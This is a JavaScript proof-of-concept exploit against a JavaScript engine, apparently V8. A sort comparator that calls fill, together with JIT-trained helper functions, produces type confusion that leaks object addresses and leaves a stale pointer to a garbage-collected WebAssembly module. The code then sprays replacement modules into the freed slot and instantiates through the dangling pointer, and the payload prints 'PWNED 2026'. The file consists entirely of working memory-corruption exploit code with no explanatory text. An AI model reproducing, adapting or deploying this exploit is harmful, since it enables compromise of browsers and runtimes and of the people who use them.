function confuse(a) {
  function compare() { a.fill(0); return -1; }
  a.sort(compare);
}

function copySmi(dst, src) { dst[100] = src[1]; }
function untag(src) { return src[1] - 0.25; }

for (let i = 0; i < 1000; ++i) {
  confuse([1, 2]);
  confuse([{}, {}]);
  copySmi(new Array(256).fill(0), [1, 2]);
  untag([1, 2]);
}

// The original module has no imports and returns 0x1111.
const originalBytes = new Uint8Array([
  0,97,115,109,1,0,0,0,1,5,1,96,0,1,127,3,2,1,0,
  7,8,1,4,109,97,105,110,0,0,10,7,1,5,0,65,145,34,11
]);
// The replacement imports env.print; main calls it and returns 0x2222.
const replacementBytes = new Uint8Array([
  0,97,115,109,1,0,0,0,1,8,2,96,0,0,96,0,1,127,
  2,13,1,3,101,110,118,5,112,114,105,110,116,0,0,
  3,2,1,1,7,8,1,4,109,97,105,110,0,1,
  10,10,1,8,0,16,0,65,162,196,0,11
]);
const originalTemplate = new WebAssembly.Module(originalBytes);
const replacementTemplate = new WebAssembly.Module(replacementBytes);
const originalImports = WebAssembly.Module.imports(originalTemplate).length;
const originalMarker = new WebAssembly.Instance(originalTemplate).exports.main();
const holder = new Array(256).fill(0);
const replacements = new Array(50000).fill(0);
const transitionObject = {};
let weak;
let staleAddress;

function addressFromSource(src) {
  const smi = Math.round(untag(src) + 0.25);
  return ((smi * 2) | 1) >>> 0;
}

setTimeout(() => {
  gc({type:"major"});
  (function install() {
    const padding = Array.from({length:1166}, (_, i) => ({x:i}));
    const alignment = new Array(0).fill(1.1);
    const module = structuredClone(originalTemplate);
    const src = [module, {}];
    if (padding[1165].x !== 1165 || alignment.length !== 0) throw 0;
    weak = new WeakRef(module);
    confuse(src);
    staleAddress = addressFromSource(src);
    copySmi(holder, src);
  })();

  setTimeout(() => {
    gc({type:"minor"});
    setTimeout(() => {
      // WeakRef proves GC no longer considers the original wrapper live.
      const originalCollected = weak.deref() === undefined;
      let hit = -1;
      let replacementAddress = null;
      let rounds = 0;

      if (originalCollected) {
        for (rounds = 1; rounds <= 4 && hit < 0; ++rounds) {
          for (let i = 0; i < 16; ++i) {
            replacements[i] = structuredClone(replacementTemplate);
          }
          gc({type:"minor"});
          for (let i = 0; i < 16; ++i) {
            const src = [replacements[i], {}];
            confuse(src);
            const address = addressFromSource(src);
            // Require a replacement wrapper at the exact stale address.
            if (address === staleAddress) {
              hit = i;
              replacementAddress = address;
              break;
            }
          }
        }
      }

      let identity = false;
      let callbackCount = 0;
      let marker = null;
      if (hit >= 0) {
        holder[0] = transitionObject;
        identity = holder[100] === replacements[hit];
        // Instantiate through the stale pointer; only the replacement can print.
        marker = new WebAssembly.Instance(holder[100], {
          env:{print() {
            ++callbackCount;
            if (typeof document === "undefined") globalThis.print("PWNED 2026");
            else console.log("PWNED 2026");
          }}
        }).exports.main();
      }

      const result = JSON.stringify({
        originalImports,
        originalMarker,
        originalCollected,
        staleAddress,
        replacementAddress,
        hit,
        identity,
        callbackCount,
        marker
      });
      console.log(result);
      if (typeof document !== "undefined") document.body.textContent = result;
    }, 0);
  }, 0);
}, 0);
